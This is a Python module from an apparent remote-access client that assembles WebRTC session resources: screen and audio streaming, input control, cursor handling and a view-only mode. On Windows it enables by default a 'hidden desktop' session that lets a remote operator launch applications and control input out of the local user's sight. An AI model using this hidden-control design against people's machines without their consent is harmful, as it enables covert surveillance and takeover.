"""Session resource factory for remote connections."""
from __future__ import annotations

from typing import Any, Callable

import logging
import os
import platform

from remote_client.control.cursor_visibility import CursorVisibilityController
from remote_client.control.handlers import ControlHandler, StabilizedControlHandler
from remote_client.control.input_controller import InputController, NullInputController
from remote_client.media.audio import AudioTrack
from remote_client.media.screen import ScreenTrack
from remote_client.webrtc.client import SessionResources

logger = logging.getLogger(__name__)


def _normalize_mode(mode: str | None) -> str:
    if not mode:
        return "manage"
    value = str(mode).strip().lower()
    if value in {"view", "viewer", "readonly"}:
        return "view"
    return "manage"


def _hidden_desktop_enabled() -> bool:
    cursor_mode = os.getenv("RC_CURSOR_MODE", "").strip().lower()
    if cursor_mode in {"independent", "hidden", "hidden_desktop"}:
        return True
    if cursor_mode in {"shared", "visible", "normal", "desktop"}:
        return False
    value = os.getenv("RC_ENABLE_HIDDEN_DESKTOP")
    if value is None or value.strip() == "":
        return True
    return value.strip().lower() in {"1", "true", "yes", "on"}


def _input_stabilizer_enabled() -> bool:
    value = os.getenv("RC_INPUT_STABILIZER", "1")
    return value.strip().lower() not in {"0", "false", "no", "off"}

def _audio_enabled() -> bool:
    value = os.getenv("RC_DISABLE_AUDIO", "").strip().lower()
    return value not in {"1", "true", "yes", "on"}


def _build_cursor_visibility_handler(
    cursor_controller: CursorVisibilityController | None,
    screen_track: object | None,
    allow_system_cursor: bool,
) -> Callable[[bool], None]:
    def _set_cursor_visibility(visible: bool) -> None:
        if allow_system_cursor and cursor_controller:
            cursor_controller.set_visible(visible)
        if screen_track and hasattr(screen_track, "set_draw_cursor"):
            try:
                screen_track.set_draw_cursor(visible)
            except Exception:
                return

    return _set_cursor_visibility


def _build_control_handler(controller: InputController) -> ControlHandler:
    if _input_stabilizer_enabled():
        return StabilizedControlHandler(controller)
    return ControlHandler(controller)


def _compose_close(
    primary: Callable[[], None] | None,
    cursor_controller: CursorVisibilityController | None,
) -> Callable[[], None] | None:
    if not primary and not cursor_controller:
        return None

    def _close() -> None:
        if cursor_controller:
            cursor_controller.reset()
        if primary:
            primary()

    return _close


def build_session_resources(mode: str | None) -> SessionResources:
    normalized = _normalize_mode(mode)
    if normalized == "view":
        cursor_controller = CursorVisibilityController()
        controller = NullInputController()
        screen_track = ScreenTrack()
        control_handler = ControlHandler(controller)
        media_tracks: list[Any] = [screen_track]
        if _audio_enabled():
            media_tracks.append(AudioTrack())

        def _set_stream_profile(
            profile: str | None,
            width: int | None,
            height: int | None,
            fps: int | None,
        ) -> None:
            for track in media_tracks:
                if hasattr(track, "set_profile"):
                    track.set_profile(profile, width, height, fps)

        return SessionResources(
            control_handler,
            media_tracks,
            close=_compose_close(None, cursor_controller),
            set_stream_profile=_set_stream_profile,
            set_cursor_visibility=_build_cursor_visibility_handler(
                cursor_controller, screen_track, True
            ),
        )

    if platform.system() == "Windows" and _hidden_desktop_enabled():
        try:
            from remote_client.windows.hidden_desktop import HiddenDesktopSession
        except Exception as exc:
            logger.warning("Hidden desktop unavailable, falling back: %s", exc)
        else:
            try:
                session = HiddenDesktopSession()
            except Exception as exc:
                logger.warning("Hidden desktop init failed, falling back: %s", exc)
            else:
                control_handler = ControlHandler(session.input_controller)
                media_tracks: list[Any] = [session.screen_track]
                if _audio_enabled():
                    media_tracks.append(AudioTrack())

                def _set_stream_profile(
                    profile: str | None,
                    width: int | None,
                    height: int | None,
                    fps: int | None,
                ) -> None:
                    for track in media_tracks:
                        if hasattr(track, "set_profile"):
                            track.set_profile(profile, width, height, fps)

                return SessionResources(
                    control_handler,
                    media_tracks,
                    close=_compose_close(session.close, None),
                    launch_app=session.launch_application,
                    set_stream_profile=_set_stream_profile,
                    set_cursor_visibility=_build_cursor_visibility_handler(
                        None, session.screen_track, False
                    ),
                )

    cursor_controller = CursorVisibilityController()
    controller = InputController()
    screen_track = ScreenTrack(draw_cursor=True)
    control_handler = _build_control_handler(controller)
    media_tracks: list[Any] = [screen_track]
    if _audio_enabled():
        media_tracks.append(AudioTrack())

    def _set_stream_profile(
        profile: str | None,
        width: int | None,
        height: int | None,
        fps: int | None,
    ) -> None:
        for track in media_tracks:
            if hasattr(track, "set_profile"):
                track.set_profile(profile, width, height, fps)

    return SessionResources(
        control_handler,
        media_tracks,
        close=_compose_close(None, cursor_controller),
        set_stream_profile=_set_stream_profile,
        set_cursor_visibility=_build_cursor_visibility_handler(
            cursor_controller, screen_track, True
        ),
    )
